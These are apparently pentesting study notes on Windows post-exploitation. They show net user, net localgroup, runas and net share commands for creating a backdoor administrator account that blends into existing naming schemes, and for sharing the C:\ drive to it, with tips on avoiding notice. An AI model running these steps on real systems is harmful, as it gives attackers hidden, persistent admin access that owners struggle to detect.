# Creating a new user post-exploit
## Pros:
A new user that looks like it ‘fits in’ is going to be harder to notice.  If it has admin power, it can do pretty much whatever without anyone paying much attention

## Cons:
If anyone is watching for new users you’ll set off the alarm.  All your activities will then be easy to watch and counteract - never mind just being blocked out.

Generally it’s worth creating a new user, however we don’t always have to use it.  It’s fairly safe though.

`net user`
get the list of user accounts on the system
look for a naming scheme, e.g. “user1, user2 user3”

`net user /add user4 testpassw0rd`
`net localgroup Administrators /add user4`
add our backdoor user
add them to the Administrators group to give them Admin permission that is persistent

if you are pen-testing you must be sensible about your backdoor.  give it authentication (proper password etc)

## Run As
Once we have the backdoor user, we want to use runas to execute programs as them.

`runas /user:user4 cmd` \[profile - which is default anyway\]
we now have a command console with Administrator privileges.
Share drives
Next thing we might want to do is share drives.

`net share [name]=C:\ /GRANT:user4.FULL`
\[name\] comes from a regular `net share`
We now have full access to the C:\ drive with user4.

#CLI #postexploit #hacking #pentesting #windows
